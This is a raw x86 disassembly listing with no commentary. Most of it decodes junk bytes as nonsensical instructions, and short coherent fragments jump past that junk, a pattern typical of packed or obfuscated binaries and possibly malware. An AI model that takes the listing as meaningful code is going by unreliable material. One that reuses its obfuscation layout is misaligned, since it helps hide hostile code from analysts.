  4058db:	adc    DWORD PTR [ebp+edi*4-0x1],edi
  4058df:	jae    0x405923
  4058e1:	lahf   
  4058e2:	push   eax
  4058e3:	fwait
  4058e4:	sub    eax,0x4c470cf4
  4058e9:	push   ds
  4058ea:	sbb    eax,0x55d49624
  4058ef:	or     dl,BYTE PTR [edx]
  4058f1:	test   eax,0x87185448
  4058f6:	cli    
  4058f7:	jno    0x4058ff
  4058f9:	and    ebp,edi
  4058fb:	bound  esp,QWORD PTR [edi]
  4058fd:	sbb    ah,dl
  4058ff:	pop    eax
  405900:	data16 shl BYTE PTR [esi+0x1f6cf2],cl
  405907:	xchg   edx,eax
  405908:	clc    
  405909:	sbb    eax,0x47d82ed6
  40590e:	ret    0xa79d
  405911:	lds    edx,FWORD PTR [edx+0x13154583]
  405917:	enter  0xc1ec,0x3a
  40591b:	mov    ds:0xcced3f0b,eax
  405920:	pusha  
  405921:	mov    fs,WORD PTR [eax-0x1906d82f]
  405927:	add    DWORD PTR ds:[ecx],0xfffffff7
  40592b:	xchg   DWORD PTR [ecx-0x35],eax
  40592e:	test   al,0xbd
  405930:	popf   
  405931:	push   eax
  405932:	sbb    eax,0x1207fc46
  405937:	adc    ecx,DWORD PTR [ebp+0x16]
  40593a:	xchg   edi,edx
  40593c:	rcl    BYTE PTR [ebp-0x5961fec7],0xae
  405943:	adc    eax,0x7d57d650
  405948:	jecxz  0x40590b
  40594a:	mov    ah,0x2b
  40594c:	loope  0x4059c8
  40594e:	xchg   esp,eax
  40594f:	jns    0x4058ed
  405951:	add    eax,0x91214b13
  405956:	cmc    
  405957:	mov    ch,0x93
  405959:	cmp    al,0xa6
  40595b:	or     dl,BYTE PTR [eax+0xab7f797]
  405961:	(bad)  
  405962:	pusha  
  405963:	sahf   
  405964:	ficomp WORD PTR [eax]
  405966:	mov    edx,0x3ff4765d
  40596b:	xor    al,0xfc
  40596d:	leave  
  40596e:	cmp    eax,0x49972726
  405973:	in     al,0xb3
  405975:	and    al,0xe8
  405977:	inc    ebp
  405978:	in     al,0x5d
  40597a:	scas   eax,DWORD PTR es:[edi]
  40597b:	fsub   DWORD PTR [ebp*8-0x37aed290]
  405982:	ds (bad) 
  405984:	ds cmp eax,0xe31d9550
  40598a:	clc    
  40598b:	dec    esp
  40598c:	dec    esi
  40598d:	test   DWORD PTR [ebx+eiz*8],ebx
  405990:	or     ebx,ebx
  405992:	xchg   ecx,eax
  405993:	pusha  
  405994:	sbb    al,0x21
  405996:	cwde   
  405997:	xchg   ebx,eax
  405998:	dec    esi
  405999:	fistp  DWORD PTR ss:0xdff3740a
  4059a0:	inc    ecx
  4059a1:	repnz out 0xe4,eax
  4059a4:	nop
  4059a5:	inc    ebx
  4059a6:	rol    DWORD PTR [eax],1
  4059a8:	dec    esp
  4059a9:	fdiv   QWORD PTR [edi-0x55]
  4059ac:	test   al,0xc3
  4059ae:	sbb    DWORD PTR [eax-0x14],esp
  4059b1:	(bad)  [edi]
  4059b3:	out    0x24,eax
  4059b5:	mov    bh,0xd5
  4059b7:	sub    eax,0xa0fb86c8
  4059bc:	cmc    
  4059bd:	inc    eax
  4059be:	fwait
  4059bf:	jnp    0x4059a8
  4059c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059c2:	popa   
  4059c3:	gs cmc 
  4059c5:	and    al,0xed
  4059c7:	ins    BYTE PTR es:[edi],dx
  4059c8:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4059ca:	jg     0x405a1d
  4059cc:	sbb    al,BYTE PTR [ebx-0x57]
  4059cf:	cmp    edi,esp
  4059d1:	imul   bl
  4059d3:	push   cs
  4059d4:	mov    ds:0x4c811c2e,eax
  4059d9:	pop    ecx
  4059da:	push   edx
  4059db:	jno    0x4059e6
  4059dd:	stos   DWORD PTR es:[edi],eax
  4059de:	arpl   bp,bp
  4059e0:	int    0x6b
  4059e2:	fucomp st(6)
  4059e4:	cmp    BYTE PTR [ebp+eax*8+0x10],cl
  4059e8:	push   edi
  4059e9:	idiv   BYTE PTR [ebx-0x75d68cf9]
  4059ef:	push   ss
  4059f0:	push   0x5c0b4e02
  4059f5:	push   DWORD PTR [esi+0x5eabb075]
  4059fb:	test   DWORD PTR [esi-0x38],0x391fe4e7
  405a02:	adc    BYTE PTR [ebx],bh
  405a04:	jle    0x405a3c
  405a06:	das    
  405a07:	ja     0x40598c
  405a09:	jno    0x4059b1
  405a0b:	test   DWORD PTR es:[edi+eiz*4-0x3ceed27a],0x37a479ca
  405a17:	xchg   edx,eax
  405a18:	inc    esi
  405a19:	repz mov eax,0x5ab12a71
  405a1f:	and    al,0x49
  405a21:	or     cl,dh
  405a23:	fidiv  WORD PTR [esi-0x671a5aa0]
  405a29:	xor    cl,dl
  405a2b:	and    eax,0x3498ecd6
  405a30:	xchg   ebx,eax
  405a31:	push   ecx
  405a32:	mov    DWORD PTR [ebp-0x4],0xf89c8534
  405a39:	and    DWORD PTR ds:0x4335db,edx
  405a3f:	mov    eax,DWORD PTR [ebp-0x4]
  405a42:	mov    edx,DWORD PTR ds:0x4336ef
  405a48:	xor    DWORD PTR ds:0x4335c3,edx
  405a4e:	push   esi
  405a4f:	mov    DWORD PTR ds:0x4336e7,0x6ead
  405a59:	mov    esi,DWORD PTR [ebp-0x8]
  405a5c:	mov    edx,0x7510853
  405a61:	and    DWORD PTR ds:0x4335bf,ebx
  405a67:	xor    eax,edx
  405a69:	and    DWORD PTR ds:0x43369b,0x0
  405a73:	mov    ecx,DWORD PTR ds:0x43369b
  405a79:	inc    ecx
  405a7a:	mov    DWORD PTR ds:0x43369b,ecx
  405a80:	cmp    DWORD PTR ds:0x43369b,0x20
  405a87:	jne    0x405a99
  405a8d:	push   DWORD PTR [ebp-0x1c]
  405a90:	push   DWORD PTR [ebp-0x24]
  405a93:	call   DWORD PTR ds:0x412258
  405a99:	cmp    DWORD PTR ds:0x43369b,0x15
  405aa0:	jb     0x405a73
  405aa6:	xor    ecx,ecx
  405aa8:	add    ecx,DWORD PTR ds:0x4335fb
  405aae:	mov    ecx,DWORD PTR [ecx]
  405ab0:	sbb    DWORD PTR ds:0x4336d7,ecx
  405ab6:	xor    esi,edx
  405ab8:	mov    ecx,0x32729a
  405abd:	add    esi,ecx
  405abf:	jmp    0x405e93
  405ac4:	aam    0x49
  405ac6:	in     eax,0x76
  405ac8:	ins    DWORD PTR es:[edi],dx
  405ac9:	jb     0x405b1e
  405acb:	imul   ebx,DWORD PTR ds:0x714d28f4,0x46dda15f
  405ad5:	xor    edi,DWORD PTR [esp+edi*2-0x4b]
  405ad9:	jns    0x405b57
  405adb:	jl     0x405a90
  405add:	jmp    0xc4a48e02
  405ae2:	rcr    edx,1
  405ae4:	mov    DWORD PTR [ebp+edi*2+0x67348e1a],esp
  405aeb:	in     eax,0x20
  405aed:	daa    
  405aee:	ficom  DWORD PTR [ebp+0x5b]
  405af1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405af2:	fwait
  405af3:	arpl   WORD PTR [eax+0x1b],bp
  405af6:	not    bl
  405af8:	inc    eax
  405af9:	iret   
  405afa:	ds add al,0x95
  405afd:	cmc    
  405afe:	jno    0x405ad9
  405b00:	sbb    bl,BYTE PTR [esi+0x8]
  405b03:	sbb    BYTE PTR [eax+0x61],ch
  405b06:	fstp   DWORD PTR [ebx-0x2726e9a0]
  405b0c:	call   FWORD PTR [ecx]
  405b0e:	cmp    eax,0xe3d5d943
  405b13:	cmp    eax,0xa1afb01d
  405b18:	leave  
  405b19:	mov    bh,0x2e
  405b1b:	test   BYTE PTR [ebp+eax*8+0xa79934f],al
  405b22:	into   
  405b23:	pop    eax
  405b24:	cwde   
  405b25:	mov    cl,0x5b
  405b27:	ficomp WORD PTR [ecx]
  405b29:	outs   dx,DWORD PTR ds:[esi]
  405b2a:	mov    dh,0x2e
  405b2c:	popa   
  405b2d:	jge    0x405af0
  405b2f:	clc    
  405b30:	dec    ebx
  405b31:	xchg   esi,eax
  405b32:	and    ah,BYTE PTR [eax+eiz*8+0x4a36ab81]
  405b39:	mov    ah,0x6
  405b3b:	idiv   BYTE PTR [esi]
  405b3d:	or     eax,0x7b96ab18
  405b42:	push   0x24fe99ef
  405b47:	retf   0xc88c
  405b4a:	shr    BYTE PTR [eax],cl
  405b4c:	std    
  405b4d:	push   ecx
  405b4e:	arpl   WORD PTR [edx+0x182c3c5a],si
  405b54:	adc    DWORD PTR ds:0x7f9785c8,0x83d8c633
  405b5e:	pusha  
  405b5f:	cmc    
  405b60:	mov    cl,0xa3
  405b62:	out    dx,eax
  405b63:	add    ah,0x69
  405b66:	push   eax
  405b67:	or     BYTE PTR [ebx-0x7f],dl
  405b6a:	enter  0xfa36,0x6d
  405b6e:	mov    ebx,0x583c4ec
  405b73:	or     ebp,DWORD PTR [ecx-0x50c002f4]
  405b79:	mov    bh,0xea
  405b7b:	jp     0x405b33
  405b7d:	in     eax,dx
  405b7e:	sub    al,0x4e
  405b80:	mov    bl,0xcf
  405b82:	repz sub eax,0x2de02622
  405b88:	dec    ecx
  405b89:	mov    eax,DWORD PTR [edi]
  405b8b:	arpl   WORD PTR [ecx-0x3],dx
  405b8e:	test   eax,0xcea34b2f
  405b93:	fs push edx
  405b95:	adc    BYTE PTR [ecx+0x40],dh
  405b98:	mov    ds:0x1c1c43dd,al
  405b9d:	mov    al,ds:0x6e5878f6
  405ba2:	arpl   WORD PTR [edx+0x1722dbb1],sp
  405ba8:	(bad)  
  405ba9:	mov    ch,0x57
  405bab:	(bad)  
  405bac:	mov    ecx,0xadd1e2a9
  405bb1:	iret   
  405bb2:	sbb    al,0xa3
  405bb4:	psadbw mm5,QWORD PTR [edi]
  405bb7:	stos   DWORD PTR es:[edi],eax
  405bb8:	ja     0x405c1c
  405bba:	out    0xd1,al
  405bbc:	cmp    DWORD PTR [edx-0x731657ea],esi
  405bc2:	adc    al,0x9b
  405bc4:	in     al,dx
  405bc5:	mov    bl,0x4e
  405bc7:	xor    al,0x2d
  405bc9:	les    esi,FWORD PTR [edx+0x6c]
  405bcc:	loope  0x405b81
  405bce:	xchg   ecx,eax
  405bcf:	loope  0x405c36
  405bd1:	int3   
  405bd2:	sbb    DWORD PTR [ebp-0x76],0xf7a41011
  405bd9:	cs stc 
  405bdb:	jbe    0x405c4a
  405bdd:	(bad)  [ebp+ecx*4+0x5e]
  405be1:	add    DWORD PTR [edx+ecx*2-0x5b42b247],ecx
  405be8:	pop    esi
  405be9:	cmc    
  405bea:	sbb    bl,bh
  405bec:	xchg   ecx,eax
  405bed:	jae    0x405c0b
  405bef:	jb     0x405c1e
  405bf1:	popf   
  405bf2:	push   esp
  405bf3:	dec    edi
  405bf4:	sbb    DWORD PTR [edx],0xf64f85a0
  405bfa:	xchg   esp,eax
  405bfb:	inc    ebp
  405bfc:	repnz icebp 
  405bfe:	xchg   ecx,eax
  405bff:	sti    
  405c00:	add    al,0xed
  405c02:	bound  esp,QWORD PTR [eax+0xf]
  405c05:	sub    DWORD PTR [eax+0x6],eax
  405c08:	fcmovne st,st(4)
  405c0a:	jo     0x405bcb
  405c0c:	adc    BYTE PTR [edi],cl
  405c0e:	repnz add eax,0x2d1d2a28
  405c14:	popf   
  405c15:	data16 (bad) 
  405c17:	retf   0x730d
  405c1a:	xchg   ebx,eax
  405c1b:	xor    ch,al
  405c1d:	push   ebp
  405c1e:	int    0x67
  405c20:	lahf   
  405c21:	scas   eax,DWORD PTR es:[edi]
  405c22:	rcr    DWORD PTR [ebx],cl
  405c24:	fdiv   QWORD PTR [ebx+esi*8]
  405c27:	fnstsw ax
  405c29:	dec    ecx
  405c2a:	arpl   WORD PTR ds:0xc82a1e3d,di
  405c30:	sub    dh,dh
  405c32:	dec    eax
  405c33:	inc    BYTE PTR [esp+edi*2-0x61afb3fb]
  405c3a:	jno    0x405c6b
  405c3c:	jp     0x405bd2
  405c3e:	sar    DWORD PTR [edi+0x138d9b86],0x3e
  405c45:	pusha  
  405c46:	fldenv [edx]
  405c48:	sahf   
  405c49:	mov    bl,BYTE PTR [eax]
  405c4b:	lods   al,BYTE PTR ds:[esi]
  405c4c:	adc    DWORD PTR [ebx+0x3aac2fb9],ebp
  405c52:	pop    eax
  405c53:	push   ebx
  405c54:	sub    al,0xbc
  405c56:	or     ebx,ebp
  405c58:	call   0xe838ec81
  405c5d:	sub    dl,dl
  405c5f:	sbb    eax,DWORD PTR [ebx+0x56]
  405c62:	int    0xc9
  405c64:	sbb    DWORD PTR [eax-0x2f798782],edi
  405c6a:	adc    al,0x1c
  405c6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c6d:	pop    es
  405c6e:	addr16 (bad) 
  405c71:	out    dx,eax
  405c72:	repnz pop ecx
  405c74:	cdq    
  405c75:	shl    BYTE PTR [eax+0x53f5952],cl
  405c7b:	out    0xaa,ax
  405c7e:	stos   BYTE PTR es:[edi],al
  405c7f:	jbe    0x405c20
  405c81:	cwde   
  405c82:	add    edx,DWORD PTR [edx]
  405c84:	sub    al,BYTE PTR [ebp+0x7c7e4122]
  405c8a:	xchg   BYTE PTR [edi-0x1b57796a],ah
  405c90:	jg     0x405c8d
  405c92:	pop    ecx
  405c93:	dec    ebx
  405c94:	cmp    bh,BYTE PTR ds:0x30f8eb8c
  405c9a:	ja     0x405ce3
  405c9c:	inc    eax
  405c9d:	mov    esi,0x3ea1e970
  405ca2:	push   esp
  405ca3:	mov    ch,0x73
  405ca5:	pop    edx
  405ca6:	daa    
  405ca7:	push   esi
  405ca8:	fnsave [edx]
  405caa:	clc    
  405cab:	xor    esi,DWORD PTR [ecx]
  405cad:	jl     0x405c65
  405caf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405cb0:	retf   0x2733
  405cb3:	fistp  WORD PTR [edx+0x2f]
  405cb6:	mov    ebp,0xd819dd5d
  405cbb:	xor    al,0x8e
  405cbd:	aam    0x55
  405cbf:	adc    ebx,DWORD PTR [esi]
  405cc1:	das    
  405cc2:	and    DWORD PTR [ebp-0x40ad9c5b],eax
  405cc8:	mov    ds:0x9bcb3fed,eax
  405ccd:	push   edx
  405cce:	clc    
  405ccf:	adc    ch,BYTE PTR [esi]
  405cd1:	inc    edx
  405cd2:	mov    esp,DWORD PTR [edi-0x15]
  405cd5:	mov    bl,0x76
  405cd7:	or     DWORD PTR [ebx+0x75],edx
  405cda:	js     0x405c7f
  405cdc:	neg    DWORD PTR [edx+0x3b536807]
  405ce2:	pop    esi
  405ce3:	push   edx
  405ce4:	dec    esp
  405ce5:	xchg   BYTE PTR [ebx+0x32],ah
  405ce8:	pop    ebx
  405ce9:	fcomp  DWORD PTR [edi-0x39f08f62]
  405cef:	or     BYTE PTR [ebx-0x4e],cl
  405cf2:	sub    bh,BYTE PTR [ecx+0x0]
  405cf5:	jnp    0x405d07
  405cf7:	daa    
  405cf8:	stos   DWORD PTR es:[edi],eax
  405cf9:	sbb    dl,0x54
  405cfc:	cmp    ecx,DWORD PTR [ecx+0x25a00bf5]
  405d02:	dec    esp
  405d03:	in     eax,dx
  405d04:	sbb    ch,BYTE PTR [edx+0x10]
  405d07:	pop    ds
  405d08:	aad    0x48
  405d0a:	test   eax,0xd22753de
  405d0f:	mov    eax,DWORD PTR [ebx+0x19]
  405d12:	fdivr  DWORD PTR [ebx]
  405d14:	push   edx
  405d15:	call   0x604a9843
  405d1a:	ja     0x405d75
  405d1c:	ins    BYTE PTR es:[edi],dx
  405d1d:	fcmovnbe st,st(3)
  405d1f:	xlat   BYTE PTR ds:[ebx]
  405d20:	xor    eax,0xb7daf920
  405d25:	adc    al,0xdb
  405d27:	xchg   ecx,eax
  405d28:	or     bl,dl
  405d2a:	ja     0x405d74
  405d2c:	or     al,dl
  405d2e:	fwait
  405d2f:	jge    0x405d17
  405d31:	fld    TBYTE PTR [eax]
  405d33:	hlt    
  405d34:	(bad)  
  405d35:	fnstenv [edx+ebx*4]
  405d38:	cwde   
  405d39:	mov    esi,0x4736b467
  405d3e:	dec    ecx
  405d3f:	(bad)  
  405d40:	in     al,dx
  405d41:	xor    al,0x23
  405d43:	ss cwde 
  405d45:	ja     0x405d80
  405d47:	loopne 0x405dc3
  405d49:	(bad)  
  405d4a:	and    DWORD PTR [edx+0x31],eax
  405d4d:	adc    DWORD PTR [ecx],ecx
  405d4f:	mov    dl,0x6
  405d51:	ret    0xb61d
  405d54:	rol    ebx,cl
  405d56:	or     al,0x46
  405d58:	addr16 jg 0x405d99
  405d5b:	lods   eax,DWORD PTR ds:[esi]
  405d5c:	sbb    BYTE PTR [ebp-0x44],0x28
  405d60:	popf   
  405d61:	pop    DWORD PTR [ecx]
  405d63:	cld    
  405d64:	jg     0x405d29
  405d66:	pushf  
  405d67:	in     al,0x6d
  405d69:	out    0x7c,al
  405d6b:	push   0x4798f9d3
  405d70:	jo     0x405d40
  405d72:	int    0xcb
  405d74:	(bad)  
  405d75:	push   esp
  405d76:	addr16 jp 0x405dc6
  405d79:	mov    edx,0x31314976
  405d7e:	mov    edx,0x19ea2f59
  405d83:	arpl   WORD PTR [ecx+0x4d],di
  405d86:	les    edi,FWORD PTR [edx]
  405d88:	inc    esp
  405d89:	scas   eax,DWORD PTR es:[edi]
  405d8a:	jge    0x405d20
  405d8c:	std    
  405d8d:	inc    eax
  405d8e:	or     eax,0x9d93d1f1
  405d93:	sub    al,0xb9
  405d95:	add    eax,0x3fa1165d
  405d9a:	les    ebx,FWORD PTR [edx]
  405d9c:	scas   al,BYTE PTR es:[edi]
  405d9d:	dec    ebp
  405d9e:	sbb    al,0xb8
  405da0:	sub    ebp,DWORD PTR [edx]
  405da2:	pop    esi
  405da3:	test   esi,edx
  405da5:	push   ebp
  405da6:	jns    0x405d54
  405da8:	lods   al,BYTE PTR ds:[esi]
  405da9:	clc    
  405daa:	mov    ds:0x69fbc11a,eax
  405daf:	xor    dl,cl
  405db1:	adc    BYTE PTR [ebp+0x5fb203c],ch
  405db7:	(bad)  
  405db8:	lods   eax,DWORD PTR ds:[esi]
  405db9:	sbb    bh,dh
  405dbb:	mov    ds:0x27068647,eax
  405dc0:	xchg   ebx,eax
  405dc1:	repz dec ecx
  405dc3:	sub    al,dl
  405dc5:	push   ds
  405dc6:	push   ebp
  405dc7:	mov    dl,0x9
  405dc9:	stos   BYTE PTR es:[edi],al
  405dca:	mov    bh,0x9c
  405dcc:	lahf   
  405dcd:	fwait
  405dce:	inc    ecx
  405dcf:	pop    ds
  405dd0:	iret   
  405dd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405dd2:	jb     0x405dd1
  405dd4:	sub    eax,0x3ca35aa3
  405dd9:	dec    edx
  405dda:	shl    DWORD PTR [ecx+0x60],1
  405ddd:	aas    
  405dde:	pop    esi
  405ddf:	cmp    ebx,DWORD PTR ds:0xe1694379
  405de5:	lds    eax,FWORD PTR [esp+ebp*1]
  405de8:	inc    ebx
  405de9:	add    bl,BYTE PTR [edi+0x598fa386]
  405def:	xchg   esi,eax
  405df0:	xor    DWORD PTR ds:0x5a2da9eb,ebp
  405df6:	and    BYTE PTR [eax-0x5e],bh
  405df9:	jle    0x405e24
  405dfb:	nop
  405dfc:	xchg   edx,eax
  405dfd:	and    edx,ebp
  405dff:	push   edx
  405e00:	xor    BYTE PTR [edi],0x1d
  405e03:	and    DWORD PTR [ebx+0x4b],eax
  405e06:	fisttp DWORD PTR [ecx]
  405e08:	ja     0x405e4b
  405e0a:	in     eax,0x70
  405e0c:	xchg   esi,eax
  405e0d:	pushf  
  405e0e:	fisttp QWORD PTR [ebp+0x70]
  405e11:	or     esp,edx
  405e13:	push   ds
  405e14:	les    edi,FWORD PTR [ecx]
  405e16:	adc    ecx,ebx
  405e18:	es test eax,0xcc3c46d3
  405e1e:	cli    
  405e1f:	xor    eax,0x3fab83cd
  405e24:	and    al,0xd0
  405e26:	jbe    0x405e2f
  405e28:	lock xchg esp,eax
  405e2a:	jne    0x405de5
  405e2c:	clc    
  405e2d:	pop    ds
  405e2e:	mov    eax,ds:0x80a6f869
  405e33:	out    dx,eax
  405e34:	pop    edi
  405e35:	and    al,0x1e
  405e37:	add    al,0x43
  405e39:	fsub   DWORD PTR [ebp-0x708f69f]
  405e3f:	retf   
  405e40:	fwait
  405e41:	pop    esp
  405e42:	dec    ebp
  405e43:	(bad)  
  405e44:	push   0x88d8dd29
  405e49:	(bad)  
  405e4a:	jae    0x405e38
  405e4c:	fwait
  405e4d:	(bad)  
  405e4e:	out    dx,eax
  405e4f:	pop    esi
  405e50:	sbb    DWORD PTR [esi],ecx
  405e52:	lahf   
  405e53:	or     al,0x54
  405e55:	shl    ebp,cl
  405e57:	stos   BYTE PTR es:[edi],al
  405e58:	outs   dx,DWORD PTR ds:[esi]
  405e59:	cmp    al,0x4
  405e5b:	bound  edx,QWORD PTR [esi+0x30]
  405e5e:	mov    edi,0x5e09b7a6
  405e63:	xchg   ebp,eax
  405e64:	gs pop ds
  405e66:	or     DWORD PTR [edx],ebp
  405e68:	lods   al,BYTE PTR ds:[esi]
  405e69:	mov    ebp,0xebc8761b
  405e6e:	fldenv cs:[edx+0x1c]
  405e72:	mov    bl,0xce
  405e74:	jne    0x405e4b
  405e76:	lea    esi,[ecx+0x3f588135]
  405e7c:	add    edx,0x5d
  405e7f:	je     0x405e09
  405e81:	mov    BYTE PTR [ecx+0x7ed02b7e],bl
  405e87:	retf   0x52e6
  405e8a:	jo     0x405ec6
  405e8c:	add    DWORD PTR [ebx-0x388d458c],ecx
  405e92:	test   DWORD PTR [ebx],0xc6af0fc1
  405e98:	mov    esi,DWORD PTR [ebp+0xc]
  405e9b:	cmp    esi,eax
  405e9d:	jne    0x405eb9
  405ea3:	mov    eax,DWORD PTR [ebp-0x4]
  405ea6:	mov    esi,DWORD PTR [ebp-0x8]
  405ea9:	xor    eax,edx
  405eab:	xor    esi,edx
  405ead:	add    eax,ecx
  405eaf:	add    esi,ecx
  405eb1:	imul   eax,esi
  405eb4:	jmp    0x4062c8
  405eb9:	mov    eax,DWORD PTR [ebp+0xc]
  405ebc:	mov    eax,DWORD PTR [eax+0x78]
  405ebf:	mov    DWORD PTR [ebp+0xc],eax
  405ec2:	mov    eax,DWORD PTR [ebp-0x4]
  405ec5:	jmp    0x406299
  405eca:	bound  edx,QWORD PTR [eax-0x1c8e3b49]
  405ed0:	jge    0x405e84
  405ed2:	pop    ecx
  405ed3:	jo     0x405ebe
  405ed5:	mov    esi,0x639fe3c5
  405eda:	(bad)  
  405edb:	aas    
  405edc:	jl     0x405f5a
  405ede:	mov    ch,0x79
  405ee0:	jl     0x405f5e
  405ee2:	out    0xf7,al
  405ee4:	pop    esp
  405ee5:	push   eax
  405ee6:	sbb    al,0xb1
  405ee8:	inc    eax
  405ee9:	repz (bad) 
  405eeb:	push   edi
  405eec:	pop    ds
  405eed:	jmp    0x71ef:0xf02f7fc7
  405ef4:	sbb    BYTE PTR [edi],ch
  405ef6:	mov    esp,ecx
  405ef8:	retf   0xf23c
  405efb:	fiadd  DWORD PTR [esi+0xc5c51e4]
  405f01:	push   cs
  405f02:	push   es
  405f03:	in     al,dx
  405f04:	js     0x405f6b
  405f06:	xor    BYTE PTR [esi-0x2d],dh
  405f09:	sar    DWORD PTR [esi+eax*8],1
  405f0c:	jno    0x405f51
  405f0e:	clc    
  405f0f:	inc    edi
  405f10:	bound  esi,QWORD PTR [esi*8-0x2b77e206]
  405f17:	mov    bh,0xab
  405f19:	mov    eax,0xbe2b78cb
  405f1e:	shr    BYTE PTR [esi-0x61c03fdf],1
  405f24:	das    
  405f25:	stos   DWORD PTR es:[edi],eax
  405f26:	mov    ds:0x1267973a,al
  405f2b:	cld    
  405f2c:	daa    
  405f2d:	sub    DWORD PTR [edx],esi
  405f2f:	js     0x405ed3
  405f31:	xchg   ecx,eax
  405f32:	add    DWORD PTR [ebp-0x6518fe29],eax
  405f38:	xchg   esp,eax
  405f39:	call   0x9ff88649
  405f3e:	es repz scas ax,WORD PTR es:[edi]
  405f42:	repz pop ecx
  405f44:	mov    ebx,ebp
  405f46:	push   edx
  405f47:	sbb    bl,BYTE PTR [edi+0x588a85ff]
  405f4d:	adc    edi,DWORD PTR [esi-0x38]
  405f50:	push   ebp
  405f51:	shl    DWORD PTR [ecx],1
  405f53:	jl     0x405f0b
  405f55:	out    dx,eax
  405f56:	add    esi,esi
  405f58:	xchg   esi,eax
  405f59:	enter  0x83e,0x19
  405f5d:	push   ss
  405f5e:	mov    ebp,0x2e293aaf
  405f63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f64:	cmp    eax,0x190b476c
  405f69:	mov    bh,0x0
  405f6b:	or     al,0xe
  405f6d:	and    al,0x27
  405f6f:	popf   
  405f70:	ror    DWORD PTR [ecx+0x2310a7eb],1
  405f76:	jg     0x405f4f
  405f78:	dec    esi
  405f79:	jns    0x405f0e
  405f7b:	in     al,0x50
  405f7d:	mov    dh,0xed
  405f7f:	inc    ebx
  405f80:	mov    edi,0x15aee9cf
  405f85:	mov    esi,0xe271a3a7
  405f8a:	or     BYTE PTR [ebp+0x5f],dh
  405f8d:	cmp    DWORD PTR cs:[edi+0x3d],0xffffff9a
  405f92:	sub    BYTE PTR [edx-0x48],dl
  405f95:	xchg   esi,eax
  405f96:	and    DWORD PTR [ecx],esi
  405f98:	jge    0x405fd2
  405f9a:	repz xchg esi,eax
  405f9c:	outs   dx,BYTE PTR ds:[esi]
  405f9d:	jbe    0x405fb9
  405f9f:	dec    ebx
  405fa0:	std    
  405fa1:	aas    
  405fa2:	sub    al,0xf5
  405fa4:	lods   al,BYTE PTR ds:[esi]
  405fa5:	outs   dx,DWORD PTR ds:[esi]
  405fa6:	push   edi
  405fa7:	cli    
  405fa8:	add    DWORD PTR ds:0x5be96c50,edi
  405fae:	add    eax,0x13f81f7
  405fb3:	cmp    ebx,DWORD PTR [edi+0x5a]
  405fb6:	int    0x7c
  405fb8:	pop    esp
  405fb9:	lods   eax,DWORD PTR ds:[esi]
  405fba:	mov    eax,0x47b82c96
  405fc0:	xor    DWORD PTR [edi-0x48c1dc86],ecx
  405fc6:	pop    es
  405fc7:	mov    ds:0x90da514f,al
  405fcc:	adc    ecx,edi
  405fce:	dec    ecx
  405fcf:	dec    esi
  405fd0:	sub    eax,0x3f34d2a2
  405fd5:	pop    ecx
  405fd6:	shr    DWORD PTR [ebp-0x7dc69494],1
  405fdc:	xor    bh,BYTE PTR [edi]
  405fde:	jb     0x405fa5
  405fe0:	daa    
  405fe1:	jg     0x406016
  405fe3:	xor    eax,0x713ce4f4
  405fe8:	pop    esi
  405fe9:	mov    dl,0x7e
  405feb:	dec    edx
  405fec:	pop    edi
  405fed:	push   edi
  405fee:	xchg   ecx,eax
  405fef:	(bad)  
  405ff0:	or     al,0x86
  405ff2:	dec    esi
  405ff3:	lahf   
  405ff4:	(bad)  
  405ff5:	or     al,0x5d
  405ff7:	ret    0xd37a
  405ffa:	xor    DWORD PTR gs:[ebx],edx
  405ffd:	js     0x40603e
  405fff:	call   0xca32:0xb7b1974d
  406006:	shl    DWORD PTR [eax+0x7338b210],0x14
  40600d:	sub    eax,0x4e3f6d02
  406012:	bound  ebp,QWORD PTR [edx-0x609e9d2e]
  406018:	int    0xe8
  40601a:	push   es
  40601b:	cmp    esi,DWORD PTR es:[eax]
  40601e:	jns    0x405feb
  406020:	cld    
  406021:	retf   
  406022:	mov    dl,0xbb
  406024:	mov    ds:0xd7fd89a9,eax
  406029:	into   
  40602a:	mov    ds:0xd10d48f5,eax
  40602f:	push   ebx
  406030:	lock mov gs,WORD PTR [eax]
  406033:	jg     0x406018
  406035:	mov    ds,WORD PTR [eax+0xe]
  406038:	adc    eax,0x75c3c28d
  40603d:	ret    0xf6a
  406040:	enter  0x4c6d,0xaa
  406044:	xor    bl,dh
  406046:	sbb    cl,dl
  406048:	addr16 pop ds
  40604a:	aas    
  40604b:	aad    0xb
  40604d:	pop    edi
  40604e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40604f:	mov    al,0x7c
  406051:	pop    eax
  406052:	sub    eax,DWORD PTR [edi+esi*8]
  406055:	sbb    ecx,edi
  406057:	int3   
  406058:	adc    BYTE PTR [edx+0xdc3d73f],dh
  40605e:	dec    edi
  40605f:	jp     0x406046
  406061:	and    al,0xc2
  406063:	or     eax,ebp
  406065:	ret    
  406066:	adc    ecx,DWORD PTR [eax-0x30]
  406069:	dec    esi
  40606a:	adc    bh,BYTE PTR [ebx]
  40606c:	jmp    0x4060a7
  40606e:	daa    
  40606f:	jmp    0xaf1a:0xd1b2c984
  406076:	mov    al,ds:0x3c8f657
  40607b:	inc    ecx
  40607c:	(bad)  
  40607e:	jmp    0xfccc:0xebd12ef6
  406085:	imul   BYTE PTR [eax-0x2f133f8b]
  40608b:	xor    bl,dl
  40608d:	in     al,0x5
  40608f:	clc    
  406090:	inc    ecx
  406091:	cmp    eax,0x77591a54
  406096:	in     al,dx
  406097:	lods   eax,DWORD PTR ds:[esi]
  406098:	cmp    cl,BYTE PTR [ecx+ebp*2+0x30b7881b]
  40609f:	xor    eax,DWORD PTR [ecx]
  4060a1:	(bad)  
  4060a2:	iret   
  4060a3:	xor    BYTE PTR [esi+esi*2-0x54bb282e],ch
  4060aa:	mov    esi,0xd72aedef
  4060af:	dec    esp
  4060b0:	aaa    
  4060b1:	frstor [edx-0x563bbbe5]
  4060b7:	pop    ecx
  4060b8:	mov    dl,bl
  4060ba:	pop    eax
  4060bb:	fwait
  4060bc:	push   ds
  4060bd:	out    dx,eax
  4060be:	cmp    BYTE PTR [bx+di-0x32],0x6c
  4060c3:	ins    BYTE PTR es:[edi],dx
  4060c4:	push   ebx
  4060c5:	sub    eax,0x7342dcb0
